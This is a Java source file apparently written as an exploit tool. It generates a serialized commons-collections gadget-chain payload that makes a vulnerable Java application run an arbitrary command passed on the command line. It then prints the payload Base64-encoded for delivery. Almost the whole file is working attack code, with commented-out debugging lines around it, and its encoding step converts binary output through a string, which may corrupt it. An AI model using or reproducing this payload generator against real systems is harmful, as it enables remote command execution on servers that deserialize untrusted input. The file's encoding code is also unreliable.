

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;
import java.util.Scanner;

/*
	Gadget chain:
		ObjectInputStream.readObject()
			AnnotationInvocationHandler.readObject()
				Map(Proxy).entrySet()
					AnnotationInvocationHandler.invoke()
						LazyMap.get()
							ChainedTransformer.transform()
								ConstantTransformer.transform()
								InvokerTransformer.transform()
									Method.invoke()
										Class.getMethod()
								InvokerTransformer.transform()
									Method.invoke()
										Runtime.getRuntime()
								InvokerTransformer.transform()
									Method.invoke()
										Runtime.exec()

	Requires:
		commons-collections
 */
public class PayloadGenerator {

    public static void main(String[] args) throws Exception {
        String[] command = new String[] { args[0] };
//        String[] command = new String[]{"calc.exe"};

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{
                        String.class, Class[].class}, new Object[]{
                        "getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{
                        Object.class, Object[].class}, new Object[]{
                        null, new Object[0]}),
                new InvokerTransformer("exec",
                        new Class[]{String.class}, command)
        };

        Transformer transformerChain = new ChainedTransformer(transformers);

        Map originalMap = new HashMap();
        originalMap.put("value", "value");
        Map decoratedMap = TransformedMap.decorate(originalMap, null, transformerChain);

        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor ctor = c.getDeclaredConstructor(Class.class, Map.class);
        ctor.setAccessible(true);
        Object aih = ctor.newInstance(Target.class, decoratedMap);
//        ByteArrayOutputStream test = new ByteArrayOutputStream();
//        PrintStream PS = new PrintStream(test);
//        PrintStream old = System.out;

//        OutputStream os = new PrintStream();

//        RememberAllWrittenTextPrintStream ps
//                = new RememberAllWrittenTextPrintStream(System.out, "encodingBase64");
//        System.setOut(PS);
//        String response = System.console().readLine();
//        System.out.println(response);
//        Scanner sc = new Scanner(System.in);
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(out);
//        String originalInput = oos.toString();
        oos.writeObject(aih);
//        String encodedString = Base64.getEncoder().encodeToString(originalInput.getBytes());
//        System.out.println(encodedString);
        oos.close();

//        ps.getAllWrittenText();
//        PS.println();
//        String st = sc.next();
//        System.out.println(response);
//        Base64 base64 = new Base64();

        System.out.println("One - Previous console");
        System.out.println(out);
        byte[] originalInput = out.toString().getBytes();
        String originalInputS = out.toString();
        String encodedString = Base64.getEncoder().encodeToString(originalInput);
        System.out.println(encodedString);
        String encodedString2 = new String(Base64.getEncoder().encode(originalInputS.getBytes()));
        System.out.println(encodedString2);
//
//        PrintStream previousConsole = System.out;
//
//        ByteArrayOutputStream newConsole = new ByteArrayOutputStream();
//        System.setOut(new PrintStream(newConsole));
//
//        System.out.println("Two - New console");
//
//        previousConsole.println(newConsole.toString());
//        System.setOut(previousConsole);
//
//        // Test print to console.
//        System.out.println("Three - Restored console");
//        System.out.println(newConsole.toString());

    }

}
